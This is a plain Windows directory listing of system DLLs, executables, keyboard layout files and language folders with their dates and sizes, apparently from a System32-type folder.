09/15/2018  09:13 AM            11,776 FamilySafetyExt.dll
09/07/2019  02:20 AM           387,832 Faultrep.dll
09/15/2018  09:11 AM            22,528 fc.exe
09/07/2019  02:20 AM            59,392 fdBth.dll
09/15/2018  09:13 AM            10,752 fdBthProxy.dll
09/15/2018  09:13 AM            27,136 FdDevQuery.dll
09/15/2018  09:13 AM           126,464 fde.dll
09/15/2018  09:13 AM           129,024 fdeploy.dll
09/15/2018  09:13 AM            47,616 fdPnp.dll
09/15/2018  09:13 AM           251,904 fdprint.dll
09/15/2018  09:13 AM            28,672 fdProxy.dll
09/15/2018  09:13 AM            89,088 fdSSDP.dll
09/15/2018  09:13 AM            92,160 fdWCN.dll
09/15/2018  09:13 AM            24,576 fdWNet.dll
09/15/2018  09:14 AM           127,488 fdWSD.dll
09/15/2018  09:12 AM           196,608 feclient.dll
09/15/2018  09:13 AM            49,152 ffbroker.dll
09/15/2018  11:06 AM    <DIR>          fi-FI
09/15/2018  09:13 AM           165,888 fidocredprov.dll
09/15/2018  09:13 AM           461,312 filemgmt.dll
09/15/2018  09:11 AM            14,848 find.exe
09/15/2018  09:13 AM            53,760 findnetprinters.dll
09/15/2018  09:11 AM            29,696 findstr.exe
09/15/2018  09:12 AM            13,312 finger.exe
09/15/2018  09:13 AM            86,016 fingerprintcredential.dll
09/07/2019  02:20 AM           385,024 FirewallAPI.dll
09/15/2018  09:13 AM           883,712 FirewallControlPanel.dll
09/15/2018  09:13 AM            16,384 fixmapi.exe
09/15/2018  11:08 AM           835,144 FlashPlayerApp.exe
09/15/2018  11:08 AM           179,808 FlashPlayerCPLApp.cpl
09/07/2019  02:20 AM           730,112 FlightSettings.dll
09/15/2018  09:11 AM            27,840 fltLib.dll
09/15/2018  09:11 AM            24,064 fltMC.exe
09/15/2018  09:11 AM            54,800 fmifs.dll
09/15/2018  09:12 AM           158,208 fms.dll
09/15/2018  09:13 AM           107,008 Fondue.exe
09/07/2019  02:20 AM           660,544 fontdrvhost.exe
09/15/2018  09:13 AM           909,824 fontext.dll
09/15/2018  09:13 AM            49,664 FontGlyphAnimator.dll
09/07/2019  02:20 AM            98,816 fontsub.dll
09/15/2018  09:13 AM           113,152 fontview.exe
09/15/2018  09:11 AM            40,960 forfiles.exe
09/15/2018  09:11 AM            46,080 format.com
09/15/2018  09:13 AM            97,792 fphc.dll
09/15/2018  11:06 AM    <DIR>          fr-CA
09/15/2018  11:06 AM    <DIR>          fr-FR
09/15/2018  09:13 AM           198,144 framedyn.dll
09/15/2018  09:13 AM           238,080 framedynos.dll
09/15/2018  09:13 AM            66,560 frprov.dll
09/15/2018  09:13 AM           262,144 FSClient.dll
09/15/2018  09:13 AM           144,909 fsmgmt.msc
09/15/2018  09:13 AM           128,000 fsquirt.exe
09/07/2019  02:20 AM           148,480 fsutil.exe
09/15/2018  09:11 AM            26,624 fsutilext.dll
09/15/2018  09:12 AM            48,640 ftp.exe
09/15/2018  09:14 AM           138,240 fundisc.dll
09/07/2019  02:21 AM           667,136 fveapi.dll
09/07/2019  02:21 AM           311,808 fveapibase.dll
09/15/2018  11:08 AM            21,504 fvecerts.dll
09/15/2018  09:13 AM           129,536 fwbase.dll
09/15/2018  09:12 AM            45,056 fwcfg.dll
09/15/2018  09:13 AM           190,464 fwpolicyiomgr.dll
09/15/2018  09:13 AM           313,856 FWPUCLNT.DLL
09/15/2018  09:12 AM            58,880 FwRemoteSvr.dll
09/15/2018  09:13 AM            50,688 g711codc.ax
09/15/2018  09:13 AM            98,816 GameChatTranscription.dll
09/15/2018  09:13 AM            22,528 gamemode.dll
09/15/2018  09:13 AM            19,456 gameux.dll
09/15/2018  09:13 AM           125,440 gamingtcui.dll
09/15/2018  09:13 AM            24,006 gb2312.uce
09/15/2018  09:13 AM           124,416 gcdef.dll
09/07/2019  02:20 AM           137,864 gdi32.dll
09/07/2019  02:20 AM         1,465,472 gdi32full.dll
09/07/2019  02:20 AM         1,485,312 GdiPlus.dll
09/15/2018  09:13 AM            43,008 Geocommon.dll
09/15/2018  09:13 AM           370,176 Geolocation.dll
09/15/2018  09:13 AM            65,024 getmac.exe
09/15/2018  09:13 AM             8,704 getuname.dll
09/15/2018  09:13 AM           392,192 glmf32.dll
09/15/2018  09:13 AM           195,072 GlobCollationHost.dll
09/15/2018  09:13 AM           112,128 globinputhost.dll
09/15/2018  09:13 AM           244,736 glu32.dll
09/15/2018  09:12 AM            32,768 gmsaclient.dll
09/15/2018  11:06 AM         4,171,264 gnsdk_fp.dll
09/15/2018  09:12 AM           111,024 gpapi.dll
09/15/2018  09:12 AM         1,042,944 gpedit.dll
09/15/2018  09:13 AM           147,439 gpedit.msc
09/15/2018  09:12 AM           564,736 gpprefcl.dll
09/15/2018  09:13 AM            31,744 gpprnext.dll
09/15/2018  09:12 AM           195,072 gpresult.exe
09/15/2018  09:12 AM            40,960 gpscript.dll
09/15/2018  09:12 AM            37,888 gpscript.exe
09/15/2018  09:13 AM            20,992 gptext.dll
09/15/2018  09:12 AM            24,576 gpupdate.exe
09/15/2018  09:13 AM           104,448 GraphicsCapture.dll
09/15/2018  09:19 AM    <DIR>          GroupPolicy
09/15/2018  09:19 AM    <DIR>          GroupPolicyUsers
09/15/2018  09:13 AM            39,936 grpconv.exe
09/15/2018  09:12 AM            67,584 hbaapi.dll
09/15/2018  09:13 AM            46,080 hcproviders.dll
09/15/2018  09:13 AM           252,064 HdcpHandler.dll
09/15/2018  09:13 AM           373,248 hdwwiz.cpl
09/15/2018  09:13 AM            65,536 hdwwiz.exe
09/15/2018  11:06 AM    <DIR>          he-IL
09/15/2018  09:13 AM           205,312 HeatCore.dll
09/15/2018  09:11 AM             9,728 help.exe
09/15/2018  09:13 AM            44,032 HelpPaneProxy.dll
09/15/2018  09:13 AM           569,856 hgcpl.dll
09/15/2018  09:13 AM            16,384 hh.exe
09/07/2019  02:20 AM           577,024 hhctrl.ocx
09/15/2018  09:13 AM            45,056 hhsetup.dll
09/15/2018  09:12 AM            28,160 hid.dll
09/15/2018  09:13 AM            32,256 hidphone.tsp
09/15/2018  09:12 AM            29,696 hidserv.dll
09/07/2019  02:20 AM            99,840 hlink.dll
09/07/2019  02:20 AM            46,080 hmkd.dll
09/15/2018  09:13 AM           329,216 hnetcfg.dll
09/15/2018  09:13 AM           206,336 HNetCfgClient.dll
09/15/2018  09:13 AM            14,336 hnetmon.dll
09/15/2018  09:12 AM            11,776 HOSTNAME.EXE
09/15/2018  11:06 AM    <DIR>          hr-HR
09/15/2018  09:13 AM           339,968 HrtfApo.dll
09/15/2018  09:13 AM           338,432 html.iec
09/15/2018  09:12 AM            27,648 httpapi.dll
09/15/2018  09:13 AM            35,840 htui.dll
09/15/2018  11:06 AM    <DIR>          hu-HU
09/15/2018  09:13 AM           197,632 iac25_32.ax
09/15/2018  09:13 AM            23,040 ias.dll
09/15/2018  09:13 AM            65,536 iasacct.dll
09/15/2018  09:13 AM            55,808 iasads.dll
09/15/2018  09:13 AM            55,808 iasdatastore.dll
09/15/2018  09:13 AM            74,752 iashlpr.dll
09/15/2018  09:13 AM            18,432 iashost.exe
09/15/2018  09:13 AM           568,120 IasMigPlugin.dll
09/15/2018  09:13 AM           107,008 iasnap.dll
09/15/2018  09:13 AM            40,448 iaspolcy.dll
09/15/2018  09:13 AM           187,392 iasrad.dll
09/15/2018  09:13 AM           132,096 iasrecst.dll
09/15/2018  09:13 AM           198,144 iassam.dll
09/15/2018  09:13 AM           361,472 iassdo.dll
09/15/2018  09:13 AM           129,024 iassvcs.dll
09/15/2018  09:11 AM            29,696 icacls.exe
09/15/2018  09:13 AM            84,992 iccvid.dll
09/15/2018  09:13 AM           236,032 icm32.dll
09/15/2018  09:12 AM             2,560 icmp.dll
09/15/2018  09:13 AM            20,992 icmui.dll
09/15/2018  09:13 AM            11,776 IconCodecService.dll
09/15/2018  09:13 AM           198,656 icsigd.dll
09/15/2018  09:13 AM            15,872 icsunattend.exe
09/15/2018  09:19 AM    <DIR>          icsxml
09/07/2019  02:20 AM         1,618,944 icuin.dll
09/07/2019  02:20 AM         1,155,072 icuuc.dll
09/15/2018  09:13 AM            94,208 IdCtrls.dll
09/15/2018  09:13 AM            60,458 ideograf.uce
09/15/2018  09:13 AM             7,680 idndl.dll
09/15/2018  09:13 AM           114,688 IDStore.dll
09/15/2018  09:13 AM           120,832 IEAdvpack.dll
09/15/2018  09:13 AM         1,448,448 ieapfltr.dll
09/07/2019  02:20 AM           345,600 iedkcs32.dll
09/07/2019  02:20 AM        12,244,992 ieframe.dll
09/15/2018  09:13 AM            63,488 iemigplugin.dll
09/15/2018  09:13 AM           131,584 iepeers.dll
09/07/2019  02:20 AM           362,496 ieproxy.dll
09/15/2018  09:13 AM            38,400 iernonce.dll
09/07/2019  02:20 AM         2,279,296 iertutil.dll
09/15/2018  09:13 AM            70,144 iesetup.dll
09/15/2018  09:13 AM            36,864 iesysprep.dll
09/15/2018  09:13 AM           482,304 ieui.dll
09/15/2018  09:13 AM             3,329 ieuinit.inf
09/15/2018  09:13 AM           123,392 ieUnatt.exe
09/15/2018  09:13 AM           152,064 iexpress.exe
09/15/2018  09:12 AM            25,600 ifmon.dll
09/15/2018  09:11 AM           188,432 ifsutil.dll
09/15/2018  09:13 AM            14,336 ifsutilx.dll
04/13/2025  06:55 PM            41,401 IIsExt.vbs
09/15/2018  09:14 AM             2,560 iismui.dll
04/13/2025  06:54 PM            16,384 iisreset.exe
04/13/2025  06:54 PM             9,728 iisrstap.dll
04/13/2025  06:54 PM           169,984 iisRtl.dll
04/13/2025  06:55 PM            47,974 IIsScHlp.wsc
09/15/2018  09:13 AM            30,472 imaadp32.acm
09/15/2018  09:12 AM            95,488 imagehlp.dll
09/15/2018  09:13 AM        23,542,784 imageres.dll
09/15/2018  09:13 AM           694,784 imagesp1.dll
09/15/2018  09:13 AM           114,176 imapi.dll
09/15/2018  09:13 AM           421,376 imapi2.dll
09/15/2018  09:13 AM           868,864 imapi2fs.dll
09/15/2018  09:19 AM    <DIR>          IME
09/15/2018  09:13 AM            44,032 imgutil.dll
09/07/2019  02:20 AM           144,080 imm32.dll
09/15/2018  09:13 AM           192,512 IndexedDbLegacy.dll
09/15/2018  09:13 AM           889,344 inetcomm.dll
09/07/2019  02:20 AM         2,017,792 inetcpl.cpl
09/15/2018  09:12 AM            53,248 inetmib1.dll
09/15/2018  09:13 AM            84,992 INETRES.dll
04/13/2025  06:56 PM    <DIR>          inetsrv
09/15/2018  09:13 AM            11,776 InfDefaultInstall.exe
04/13/2025  06:55 PM            17,920 infoadmn.dll
04/13/2025  06:55 PM            11,264 infoctrs.dll
09/15/2018  09:13 AM           229,376 InkEd.dll
09/15/2018  09:13 AM           694,272 InkObjCore.dll
09/15/2018  09:12 AM           304,952 input.dll
09/07/2019  02:20 AM           591,832 InputHost.dll
09/15/2018  09:13 AM            76,800 InputInjectionBroker.dll
09/15/2018  09:19 AM    <DIR>          InputMethod
09/07/2019  02:20 AM           414,208 InputSwitch.dll
09/15/2018  09:13 AM            97,280 inseng.dll
09/07/2019  02:20 AM         1,249,280 InstallService.dll
09/15/2018  09:13 AM           167,424 InstallServiceTasks.dll
09/15/2018  09:19 AM    <DIR>          InstallShield
09/15/2018  09:11 AM             8,704 instnm.exe
09/15/2018  09:13 AM           444,416 intl.cpl
09/15/2018  09:12 AM             2,560 iologmsg.dll
09/15/2018  09:12 AM            29,184 ipconfig.exe
09/15/2018  09:13 AM            48,640 IPELoggingDictationHelper.dll
09/07/2019  02:20 AM           197,832 IPHLPAPI.DLL
09/15/2018  09:19 AM    <DIR>          Ipmi
09/15/2018  09:13 AM            25,600 IpNatHlpClient.dll
09/15/2018  09:13 AM             2,560 iprop.dll
09/15/2018  09:13 AM             9,216 iprtprio.dll
09/15/2018  09:13 AM           516,608 iprtrmgr.dll
09/15/2018  09:13 AM           754,176 ipsecsnp.dll
09/15/2018  09:13 AM           408,064 ipsmsnap.dll
09/15/2018  09:13 AM             8,704 ir32_32.dll
09/15/2018  09:13 AM           197,632 ir32_32original.dll
09/15/2018  09:13 AM             9,216 ir41_32.ax
09/15/2018  09:13 AM           839,680 ir41_32original.dll
09/15/2018  09:13 AM             8,704 ir41_qc.dll
09/15/2018  09:13 AM           120,320 ir41_qcoriginal.dll
09/15/2018  09:13 AM             8,704 ir41_qcx.dll
09/15/2018  09:13 AM           338,432 ir41_qcxoriginal.dll
09/15/2018  09:13 AM             9,216 ir50_32.dll
09/15/2018  09:13 AM           746,496 ir50_32original.dll
09/15/2018  09:13 AM             8,704 ir50_qc.dll
09/15/2018  09:13 AM           200,192 ir50_qcoriginal.dll
09/15/2018  09:13 AM             9,216 ir50_qcx.dll
09/15/2018  09:13 AM           183,808 ir50_qcxoriginal.dll
09/15/2018  09:13 AM            40,232 iri.dll
09/15/2018  09:12 AM           150,528 iscsicli.exe
09/15/2018  09:13 AM           215,552 iscsicpl.dll
09/15/2018  09:13 AM           120,320 iscsicpl.exe
09/15/2018  09:12 AM            55,296 iscsidsc.dll
09/15/2018  09:12 AM             9,728 iscsied.dll
09/15/2018  09:12 AM            29,184 iscsium.dll
09/07/2019  02:20 AM            67,584 iscsiwmi.dll
09/15/2018  09:12 AM            94,720 iscsiwmiv2.dll
09/15/2018  09:13 AM           105,984 isoburn.exe
09/15/2018  11:06 AM    <DIR>          it-IT
09/15/2018  09:13 AM           157,696 itircl.dll
09/07/2019  02:20 AM           145,920 itss.dll
09/15/2018  09:13 AM           146,944 ivfsrc.ax
09/15/2018  09:13 AM            49,152 iyuv_32.dll
09/15/2018  11:06 AM    <DIR>          ja-JP
09/15/2018  09:13 AM            72,192 JavaScriptCollectionAgent.dll
09/15/2018  09:12 AM            47,616 joinproviderol.dll
09/15/2018  09:12 AM           144,896 joinutil.dll
09/15/2018  09:13 AM            90,624 joy.cpl
09/07/2019  02:20 AM           549,376 JpMapControl.dll
09/07/2019  02:20 AM           684,032 jscript.dll
09/07/2019  02:20 AM         3,702,784 jscript9.dll
09/15/2018  09:13 AM           628,736 jscript9diag.dll
09/15/2018  09:13 AM            45,568 jsproxy.dll
09/15/2018  09:13 AM             6,948 kanji_1.uce
09/15/2018  09:13 AM             8,484 kanji_2.uce
09/15/2018  09:13 AM             7,680 kbd101.DLL
09/15/2018  09:13 AM             7,168 kbd101a.DLL
09/15/2018  09:13 AM             7,168 kbd101b.DLL
09/15/2018  09:13 AM             7,168 kbd101c.DLL
09/15/2018  09:13 AM             7,168 kbd103.DLL
09/15/2018  09:13 AM             7,680 kbd106.dll
09/15/2018  09:13 AM             7,680 kbd106n.dll
09/15/2018  09:13 AM             7,168 KBDA1.DLL
09/15/2018  09:13 AM             6,656 KBDA2.DLL
09/15/2018  09:13 AM             7,168 KBDA3.DLL
09/15/2018  09:13 AM             7,680 KBDAL.DLL
09/15/2018  09:13 AM             6,656 KBDARME.DLL
09/15/2018  09:13 AM             7,168 kbdarmph.dll
09/15/2018  09:13 AM             7,168 kbdarmty.dll
09/15/2018  09:13 AM             6,656 KBDARMW.DLL
09/15/2018  09:13 AM             7,680 kbdax2.dll
09/15/2018  09:13 AM             7,168 KBDAZE.DLL
09/15/2018  09:13 AM             7,168 KBDAZEL.DLL
09/15/2018  09:13 AM             7,168 KBDAZST.DLL
09/15/2018  09:13 AM             7,168 KBDBASH.DLL
09/15/2018  09:13 AM             7,168 KBDBE.DLL
09/15/2018  09:13 AM             7,680 KBDBENE.DLL
09/15/2018  09:13 AM             7,168 KBDBGPH.DLL
09/15/2018  09:13 AM             7,168 KBDBGPH1.DLL
09/15/2018  09:13 AM             7,168 KBDBHC.DLL
09/15/2018  09:13 AM             7,168 KBDBLR.DLL
09/15/2018  09:13 AM             7,168 KBDBR.DLL
09/15/2018  09:13 AM             6,656 KBDBU.DLL
09/15/2018  09:13 AM             7,168 KBDBUG.DLL
09/15/2018  09:13 AM             7,168 KBDBULG.DLL
09/15/2018  09:13 AM             7,680 KBDCA.DLL
09/15/2018  09:13 AM             8,704 KBDCAN.DLL
09/15/2018  09:13 AM             7,168 KBDCHER.DLL
09/15/2018  09:13 AM            16,896 KBDCHERP.DLL
09/15/2018  09:13 AM             8,192 KBDCR.DLL
09/15/2018  09:13 AM             8,192 KBDCZ.DLL
09/15/2018  09:13 AM             8,192 KBDCZ1.DLL
09/15/2018  09:13 AM             8,192 KBDCZ2.DLL
09/15/2018  09:13 AM             6,656 KBDDA.DLL
09/15/2018  09:13 AM             7,168 KBDDIV1.DLL
09/15/2018  09:13 AM             7,168 KBDDIV2.DLL
09/15/2018  09:13 AM             6,656 KBDDV.DLL
09/15/2018  09:13 AM             7,168 KBDDZO.DLL
09/15/2018  09:13 AM             7,680 KBDES.DLL
09/15/2018  09:13 AM             7,168 KBDEST.DLL
09/15/2018  09:13 AM             6,656 KBDFA.DLL
09/15/2018  09:13 AM             7,168 kbdfar.dll
09/15/2018  09:13 AM             7,680 KBDFC.DLL
09/15/2018  09:13 AM             6,656 KBDFI.DLL
09/15/2018  09:13 AM             8,192 KBDFI1.DLL
09/15/2018  09:13 AM             6,656 KBDFO.DLL
09/15/2018  09:13 AM             7,168 KBDFR.DLL
09/15/2018  09:13 AM             7,168 KBDFTHRK.DLL
09/15/2018  09:13 AM             7,168 KBDGAE.DLL
09/15/2018  09:13 AM             6,656 KBDGEO.DLL
09/15/2018  09:13 AM             7,168 kbdgeoer.dll
09/15/2018  09:13 AM             7,168 kbdgeome.dll
09/15/2018  09:13 AM             7,168 kbdgeooa.dll
09/15/2018  09:13 AM             7,168 kbdgeoqw.dll
09/15/2018  09:13 AM             7,680 KBDGKL.DLL
09/15/2018  09:13 AM             7,680 KBDGN.DLL
09/15/2018  09:13 AM             7,168 KBDGR.DLL
09/15/2018  09:13 AM             7,680 KBDGR1.DLL
09/15/2018  09:13 AM             8,192 KBDGRLND.DLL
09/15/2018  09:13 AM             7,168 KBDGTHC.DLL
09/15/2018  09:13 AM             6,656 KBDHAU.DLL
09/15/2018  09:13 AM             7,168 KBDHAW.DLL
09/15/2018  09:13 AM             6,656 KBDHE.DLL
09/15/2018  09:13 AM             7,168 KBDHE220.DLL
09/15/2018  09:13 AM             7,168 KBDHE319.DLL
09/15/2018  09:13 AM             6,656 KBDHEB.DLL
09/15/2018  09:13 AM             7,168 kbdhebl3.dll
09/15/2018  09:13 AM             7,168 KBDHELA2.DLL
09/15/2018  09:13 AM             7,680 KBDHELA3.DLL
09/15/2018  09:13 AM             9,728 KBDHEPT.DLL
09/15/2018  09:13 AM             7,680 KBDHU.DLL
09/15/2018  09:13 AM             7,168 KBDHU1.DLL
09/15/2018  09:13 AM             7,680 kbdibm02.DLL
09/15/2018  09:13 AM             7,168 KBDIBO.DLL
09/15/2018  09:13 AM             6,656 KBDIC.DLL
09/15/2018  09:13 AM             7,168 KBDINASA.DLL
09/15/2018  09:13 AM             7,168 KBDINBE1.DLL
09/15/2018  09:13 AM             7,168 KBDINBE2.DLL
09/15/2018  09:13 AM             7,168 KBDINBEN.DLL
09/15/2018  09:13 AM             7,168 KBDINDEV.DLL
09/15/2018  09:13 AM             8,192 KBDINEN.DLL
09/15/2018  09:13 AM             7,168 KBDINGUJ.DLL
09/15/2018  09:13 AM             7,168 KBDINHIN.DLL
09/15/2018  09:13 AM             7,168 KBDINKAN.DLL
09/15/2018  09:13 AM             7,168 KBDINMAL.DLL
09/15/2018  09:13 AM             7,168 KBDINMAR.DLL
09/15/2018  09:13 AM             7,168 KBDINORI.DLL
09/15/2018  09:13 AM             7,168 KBDINPUN.DLL
09/15/2018  09:13 AM             7,168 KBDINTAM.DLL
09/15/2018  09:13 AM             7,168 KBDINTEL.DLL
09/15/2018  09:13 AM             8,192 KBDINUK2.DLL
09/15/2018  09:13 AM             6,656 KBDIR.DLL
09/15/2018  09:13 AM             6,144 KBDIT.DLL
09/15/2018  09:13 AM             6,656 KBDIT142.DLL
09/15/2018  09:13 AM             7,680 KBDIULAT.DLL
09/15/2018  09:13 AM             7,168 KBDJAV.DLL
09/15/2018  09:13 AM            13,824 KBDJPN.DLL
09/15/2018  09:13 AM             7,168 KBDKAZ.DLL
09/15/2018  09:13 AM             7,168 KBDKHMR.DLL
09/15/2018  09:13 AM             7,168 KBDKNI.DLL
09/15/2018  09:13 AM            13,312 KBDKOR.DLL
09/15/2018  09:13 AM             7,168 KBDKURD.DLL
09/15/2018  09:13 AM             6,656 KBDKYR.DLL
09/15/2018  09:13 AM             7,680 KBDLA.DLL
09/15/2018  09:13 AM             7,168 KBDLAO.DLL
09/15/2018  09:13 AM             7,168 kbdlisub.dll
09/15/2018  09:13 AM             7,168 kbdlisus.dll
09/15/2018  09:13 AM             7,680 kbdlk41a.dll
09/15/2018  09:13 AM             6,656 KBDLT.DLL
09/15/2018  09:13 AM             7,168 KBDLT1.DLL
09/15/2018  09:13 AM             7,168 KBDLT2.DLL
09/15/2018  09:13 AM             7,168 KBDLV.DLL
09/15/2018  09:13 AM             7,680 KBDLV1.DLL
09/15/2018  09:13 AM             8,704 KBDLVST.DLL
09/15/2018  09:13 AM             7,168 KBDMAC.DLL
09/15/2018  09:13 AM             7,168 KBDMACST.DLL
09/15/2018  09:13 AM             7,168 KBDMAORI.DLL
09/15/2018  09:13 AM             7,168 KBDMLT47.DLL
09/15/2018  09:13 AM             7,168 KBDMLT48.DLL
09/15/2018  09:13 AM             7,168 KBDMON.DLL
09/15/2018  09:13 AM             7,168 KBDMONMO.DLL
09/15/2018  09:13 AM             7,168 KBDMONST.DLL
09/15/2018  09:13 AM             7,168 KBDMYAN.DLL
09/15/2018  09:13 AM             7,168 KBDNE.DLL
09/15/2018  09:13 AM             8,192 kbdnec.DLL
09/15/2018  09:13 AM             8,192 kbdnec95.DLL
09/15/2018  09:13 AM             9,728 kbdnecat.DLL
09/15/2018  09:13 AM             8,192 kbdnecnt.DLL
09/15/2018  09:13 AM             7,680 KBDNEPR.DLL
09/15/2018  09:13 AM             6,656 kbdnko.dll
09/15/2018  09:13 AM             6,656 KBDNO.DLL
09/15/2018  09:13 AM             8,192 KBDNO1.DLL
09/15/2018  09:13 AM             7,680 KBDNSO.DLL
09/15/2018  09:13 AM             7,168 KBDNTL.DLL
09/15/2018  09:13 AM             6,656 KBDOGHAM.DLL
09/15/2018  09:13 AM             7,168 KBDOLCH.DLL
09/15/2018  09:13 AM             7,168 KBDOLDIT.DLL
09/15/2018  09:13 AM             6,656 KBDOSM.DLL
09/15/2018  09:13 AM             7,168 KBDPASH.DLL
09/15/2018  09:13 AM             7,168 kbdphags.dll
09/15/2018  09:13 AM             7,680 KBDPL.DLL
09/15/2018  09:13 AM             7,168 KBDPL1.DLL
09/15/2018  09:13 AM             7,680 KBDPO.DLL
09/15/2018  09:13 AM             8,192 KBDRO.DLL
09/15/2018  09:13 AM             8,704 KBDROPR.DLL
09/15/2018  09:13 AM             8,704 KBDROST.DLL
09/15/2018  09:13 AM             6,656 KBDRU.DLL
09/15/2018  09:13 AM             7,168 KBDRU1.DLL
09/15/2018  09:13 AM             8,192 KBDRUM.DLL
09/15/2018  09:13 AM             7,680 KBDSF.DLL
09/15/2018  09:13 AM             7,680 KBDSG.DLL
09/15/2018  09:13 AM             7,680 KBDSL.DLL
09/15/2018  09:13 AM             8,192 KBDSL1.DLL
09/15/2018  09:13 AM             8,704 KBDSMSFI.DLL
09/15/2018  09:13 AM             8,704 KBDSMSNO.DLL
09/15/2018  09:13 AM             6,656 KBDSN1.DLL
09/15/2018  09:13 AM             6,656 KBDSORA.DLL
09/15/2018  09:13 AM             7,680 KBDSOREX.DLL
09/15/2018  09:13 AM             7,680 KBDSORS1.DLL
09/15/2018  09:13 AM             7,680 KBDSORST.DLL
09/15/2018  09:13 AM             7,168 KBDSP.DLL
09/15/2018  09:13 AM             7,168 KBDSW.DLL
09/15/2018  09:13 AM             7,680 KBDSW09.DLL
09/15/2018  09:13 AM             7,168 KBDSYR1.DLL
09/15/2018  09:13 AM             7,168 KBDSYR2.DLL
09/15/2018  09:13 AM             7,168 KBDTAILE.DLL
09/15/2018  09:13 AM             7,168 KBDTAJIK.DLL
09/15/2018  09:13 AM             7,168 KBDTAT.DLL
09/15/2018  09:13 AM             7,168 KBDTH0.DLL
09/15/2018  09:13 AM             7,168 KBDTH1.DLL
09/15/2018  09:13 AM             7,168 KBDTH2.DLL
09/15/2018  09:13 AM             7,168 KBDTH3.DLL
09/15/2018  09:13 AM             7,168 KBDTIFI.DLL
09/15/2018  09:13 AM             7,168 KBDTIFI2.DLL
09/15/2018  09:13 AM             7,680 KBDTIPRC.DLL
09/15/2018  09:13 AM             7,680 KBDTIPRD.DLL
09/15/2018  09:13 AM             7,168 KBDTT102.DLL
09/15/2018  09:13 AM             7,680 KBDTUF.DLL
09/15/2018  09:13 AM             7,680 KBDTUQ.DLL
09/15/2018  09:13 AM             7,168 KBDTURME.DLL
09/15/2018  09:13 AM             7,680 KBDTZM.DLL
09/15/2018  09:13 AM             7,168 KBDUGHR.DLL
09/15/2018  09:13 AM             7,168 KBDUGHR1.DLL
09/15/2018  09:13 AM             6,656 KBDUK.DLL
09/15/2018  09:13 AM             8,192 KBDUKX.DLL
09/15/2018  09:13 AM             6,656 KBDUR.DLL
09/15/2018  09:13 AM             7,168 KBDUR1.DLL
09/15/2018  09:13 AM             6,656 KBDURDU.DLL
09/15/2018  09:13 AM             8,192 KBDUS.DLL
09/15/2018  09:13 AM             7,168 KBDUSA.DLL
09/15/2018  09:13 AM             7,168 KBDUSL.DLL
09/15/2018  09:13 AM             7,168 KBDUSR.DLL
09/15/2018  09:13 AM             7,680 KBDUSX.DLL
09/15/2018  09:13 AM             7,168 KBDUZB.DLL
09/15/2018  09:13 AM             6,656 KBDVNTC.DLL
09/15/2018  09:13 AM             7,168 KBDWOL.DLL
09/15/2018  09:13 AM             7,168 KBDYAK.DLL
09/15/2018  09:13 AM             7,168 KBDYBA.DLL
09/15/2018  09:13 AM             7,168 KBDYCC.DLL
09/15/2018  09:13 AM             8,704 KBDYCL.DLL
09/07/2019  02:20 AM           125,016 KerbClientShared.dll
09/07/2019  02:20 AM           788,480 kerberos.dll
09/15/2018  09:11 AM            51,336 kernel.appcore.dll
09/07/2019  02:20 AM           649,064 kernel32.dll
09/07/2019  02:20 AM         2,073,240 KernelBase.dll
09/15/2018  09:13 AM            39,936 KeyCredMgr.dll
09/15/2018  09:12 AM            66,048 keyiso.dll
09/15/2018  09:13 AM           156,672 keymgr.dll
09/15/2018  09:12 AM            31,744 klist.exe
09/15/2018  09:13 AM            39,424 kmddsp.tsp
09/15/2018  11:06 AM    <DIR>          ko-KR
09/15/2018  09:13 AM            12,876 korean.uce
09/15/2018  09:12 AM            31,744 ksetup.exe
09/15/2018  09:13 AM           223,744 ksproxy.ax
09/15/2018  09:13 AM            90,112 kstvtune.ax
09/15/2018  09:13 AM            20,120 ksuser.dll
09/15/2018  09:13 AM           116,736 Kswdmcap.ax
09/15/2018  09:13 AM            53,248 ksxbar.ax
09/15/2018  09:11 AM            15,360 ktmutil.exe
09/15/2018  09:11 AM            21,504 ktmw32.dll
09/07/2019  02:21 AM            57,344 ktpass.exe
09/15/2018  09:13 AM            57,856 l2gpstore.dll
09/15/2018  11:08 AM            52,736 l2nacp.dll
09/15/2018  09:13 AM           156,672 L2SecHC.dll
09/15/2018  09:12 AM            69,120 l3codeca.acm
09/15/2018  09:12 AM           189,952 l3codecp.acm
09/15/2018  09:11 AM            15,360 label.exe
09/15/2018  09:12 AM            10,240 LAPRXY.DLL
09/15/2018  09:11 AM           182,784 LaunchTM.exe
09/15/2018  09:13 AM            33,280 LaunchWinApp.exe
09/15/2018  09:13 AM           211,938 lcphrase.tbl
09/15/2018  09:13 AM            24,114 lcptr.tbl
06/13/2024  06:55 AM            61,532 license.rtf
09/15/2018  09:13 AM           840,208 LicenseManager.dll
09/15/2018  09:13 AM            74,752 LicenseManagerApi.dll
09/15/2018  09:19 AM    <DIR>          Licenses
09/07/2019  02:20 AM           334,848 LicensingDiagSpp.dll
09/07/2019  02:20 AM           622,392 LicensingWinRT.dll
09/15/2018  09:13 AM            27,136 licmgr10.dll
09/15/2018  09:13 AM            23,552 linkinfo.dll
09/15/2018  09:12 AM           100,864 loadperf.dll
09/07/2019  02:20 AM           806,568 locale.nls
09/15/2018  09:13 AM           460,288 localsec.dll
09/15/2018  09:14 AM            14,848 localui.dll
09/15/2018  09:13 AM           324,096 LocationApi.dll
09/15/2018  09:13 AM            46,080 LocationFrameworkInternalPS.dll
09/15/2018  09:13 AM            27,448 LocationFrameworkPS.dll
09/07/2019  02:20 AM           364,544 LockAppBroker.dll
09/15/2018  09:13 AM           267,264 LockScreenData.dll
09/15/2018  09:12 AM            43,520 lodctr.exe
09/15/2018  09:12 AM            89,600 logagent.exe
09/15/2018  09:19 AM    <DIR>          LogFiles
09/15/2018  09:13 AM            65,024 loghours.dll
09/15/2018  09:12 AM            97,280 logman.exe
09/15/2018  09:11 AM            19,968 logoff.exe
09/07/2019  02:20 AM           189,712 logoncli.dll
09/15/2018  09:12 AM             2,560 lpk.dll
09/15/2018  09:11 AM            23,552 lsmproxy.dll
09/15/2018  11:06 AM    <DIR>          lt-LT
09/15/2018  09:13 AM            49,168 luainstall.dll
09/15/2018  09:13 AM           144,998 lusrmgr.msc
09/15/2018  11:06 AM    <DIR>          lv-LV
09/15/2018  09:11 AM             2,560 lz32.dll
09/15/2018  09:12 AM             9,926 l_intl.nls
09/15/2018  11:08 AM    <DIR>          Macromed
09/15/2018  09:13 AM            42,496 Magnification.dll
09/15/2018  09:13 AM           749,568 Magnify.exe
09/15/2018  09:13 AM           631,808 main.cpl
09/15/2018  09:11 AM            68,608 makecab.exe
09/07/2019  02:20 AM           423,936 MapConfiguration.dll
